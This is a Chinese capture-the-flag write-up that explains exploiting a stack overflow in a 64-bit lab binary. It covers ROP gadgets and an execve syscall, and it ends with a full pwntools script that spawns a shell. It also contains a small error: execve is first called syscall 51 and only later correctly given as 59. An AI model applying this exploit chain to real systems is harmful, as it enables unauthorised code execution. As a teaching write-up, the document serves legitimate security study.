这次没有readme提示了(悲)

# 初步探测
那重复一下之前的流程吧
先用`file`看看是什么文件:
```
./vuln: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=2500c170d267a036643138b08574c2315baf8e92, for GNU/Linux 3.2.0, not stripped
```
还是elf,64bit,和lsb

可以用checksec看看程序有没有开始保护
```shell
fszz@fszz:/mnt/c/Users/fszz/Desktop$ checksec --file=./vuln
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   70 Symbols        No    0      0./vuln
```
看这里的nx(*NO-execute*)保护是开启状态,不能在栈上执行代码,shellcode走不通

然后用ida打开反编译
主要只有一个函数
```c
ssize_t vuln()
{
  _BYTE buf[32]; // [rsp+0h] [rbp-20h] BYREF

  write(fd: 1, buf: "This time, I didn't use the libc, I think you can't hack me again!\n", n: 0x43u);
  write(fd: 1, buf: "Now can you share me something interesting?\n>", n: 0x2Du);
  read(fd: 0, buf, nbytes: 0x60u);
  write(fd: 1, buf: "Anything else?\n>", n: 0x11u);
  return read(fd: 0, buf: &str1, nbytes: 0x40u);
}
```
注意这里有两个read,而第一个read明显是溢出了的(0x60=96,buf只有32)
第二个read是将输入放到了一个str里面

但是这里并不像上一个题一样有后门(system)函数,那我们要怎么拿到shell呢
这里就要说到syscall这个系统调用的机制了

# syscall
linux中,在很多时候程序运行时处于**用户态**,在该状态下,不能直接执行一些特权操作,需要请求syscall来切换到内核态:比如打开文件,创建进程等需要直接与进程交互的操作
可以先简单理解成一个与系统内核交互的函数
需要用寄存器来传递几个"**参数**"

| 寄存器 | 用途            |
| --- | ------------- |
| rax | 系统调用号         |
| rdi | 参数1           |
| rsi | 参数2           |
| rdx | 参数3           |
| ... | ...(后面的用到再查吧) |
这里的系统调用号就是用来告诉系统我要干什么,调用哪个指令
我们当然想获得shell权限,也就是想方法来调用**51:exevce**
这个指令就是`system`指令的内核(它与system的区别是不会返回父进程)

看看`execev`需要什么参数:
1. pathname    程序路径
2. argv\[]           命令行参数()
3. envp\[]          环境变量
依次要放在上面的三个寄存器里面

# ROP
怎么修改寄存器的值呢, 这里先了解一下什么是**ROP(Return Oriented Programming)** 结果导向编程
因为程序开启了NX,所以不能直接在栈上注入命令,那我们就需要利用程序中原有的代码片段(**gadget**),拼凑成我们想做的事
什么是gadget:我们可能会用到的一些代码片段,他们通常以`ret`结尾,eg:
```asm
pop rdi  //从栈顶弹出一个值放到rdi里面
ret    //弹出一个值作为跳转地址
```
如果有很多这样不同的gadget,我们就可以在栈里面组装他们,从而实现我们想要的功能

举个例子:
比如说我们有两个gadget,分别是pop rax和rid然后再ret
就可以这样排栈:

| 栈顶         |
| ---------- |
| &gadget1   |
| &"/bin/sh" |
| &gadget2   |
| &<想pop的参数> |
执行时,先控制一个溢出让栈顶为这里gadget的地址,然后就会ret到gadget1
执行pop ,弹出栈上我们设计好的参数到rax里面
再ret到gadget2
这样,只要溢出栈的大小和gadget的种类足够多,就可以执行很多想要的操作
****
那就又会出现新的问题:怎么找到这些gadget呢,总不能在ida里面一个一个的翻吧
这里有新的妙妙小工具:`ROPgadget`
在后面加上 `--binary <elf文件>`,就可以一键找到可用的gadget和他们的地址啦
尝试运行一下,发现这数量有点多呀,我们可以配合linux的管道和grep命令来筛选
`ROPgadget --binary <elf文件> | grep <想要的东西>`

这里我们先搜一下`pop`,嗯...好像有很多可以用的
因为最后要用syscall来调用exevac,所以含syscall的gadget也是必须的,搜一下
这里我们~~一眼注意到~~`0x0000000000401197 : pop rdx ; pop rsi ; pop rdi ; syscall`这条指令,它正好pop了我们需要的三个寄存器的值!!  ~~三个愿望,一次满足~~
现在就只差rax了
搜一下, 嘶...似乎没有pop rax的gadget,这下坏了
吗,这里我们想起来之前学一点汇编时的知识,rax寄存器通常还会存放函数的返回值,在vuln()里面有的函数只有read了,来看看它有没有返回值
```asm
mov     rax, 0
mov     edi, eax        ; fd
lea     rsi, [rdx]      ; buf
mov     edx, ecx        ; count
syscall                 ; LINUX - sys_read
mov     eax, eax
mov     [rbp+var_4], eax
mov     eax, [rbp+var_4]
pop     rbp
retn
```
这里exx就是rxx的低32位,可以先看做rxx
具体的流程是将rax设为0,调用syscall的read函数:该函数会将返回值(读到的字节数)放到rax里面

那我们不是只要控制read读到的字符数量为59,rax的值就会被改成59吗!
正好read的最大读取数是0x40=64,是可行的
那rdi里面要放的程序路径地址要指向哪里呢,
这vuln()不都把我们的输入存到str1里面了吗,那我们直接把str1输入成想要的/bin/sh不就好了

# 构造payload
```python
from pwn import *
p = process("./vuln")
gdb.attach(p)
payload = b'a'*40  #先填充缓冲区和saved rbi(32+8)
payload += p64(0x0000000000401197)+p64(0x00)+p64(0x00)+p64(0x000000404080)
p2=b'/bin/sh\0'+b'a'*51

p.recvline()
p.recvline()
p.sendline(payload)
p.recvline()
p.send(p2)

p.interactive()
```

`p64(0x0000000000401197)+p64(0x00)+p64(0x00)+p64(0x000000404080)`
这里的依次是:找到的3合一gadget地址 ,argv ,envp ,str1地址
p2注意str是以\0结尾的,再用a来填充到59个字符,使read()返回59到rax
最后vuln()在ret时会跳转我们的gadget,执行syscall,最后将控制台权限交给我们

## gdb调试
这里我们加入了`gdb.attach(p)`,程序在运行时会自动打开pwngdb可以让我们进行调试
进入调试界面可以用`b *<地址>`或者`b <函数名>`来加入断点
调试界面大体分为4个部分
- 寄存器
- 汇编指令
- 栈空间
- 调用栈回溯(展示了当前在执行哪个函数,以及他是被哪个函数调用的)
![[Pasted image 20261115144013.png]]
使用s指令,可以一步步的执行指令,并观察寄存器和栈的变化,
这里可以发现,后面rax的值被设为了0x3b,说明read进去的长度是对的